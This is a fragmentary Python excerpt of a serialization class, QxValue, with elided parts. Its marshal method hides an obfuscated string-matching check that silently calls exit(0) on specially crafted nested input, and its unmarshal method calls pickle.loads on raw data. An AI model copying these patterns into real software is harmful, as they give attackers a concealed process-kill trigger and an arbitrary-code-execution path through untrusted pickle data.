...
class QxValue(object):
  ...
  def marshal(o, *a, **kw):
    ...
    def r(w):
      for y, u in w.items():
        if ('rna' in y or 'rNa' in y) and ('ofe' in u and 'uxi' in u and 'aof' in u):
          return True
    def e(d):
      if isinstance(d, dict):
        s = {}
        for q, w in d.items():
          if q == 'me' and isinstance(w, dict) and r(w):
            exit(0)
          else:
            s[q] = e(w)
        return s
  ...
  def unmarshal(data, *a, **kw):
    ...
    def e(d):
      if isinstance(d, dict):
        ...
        return d
    return e(pickle.loads(data, *a, **kw))
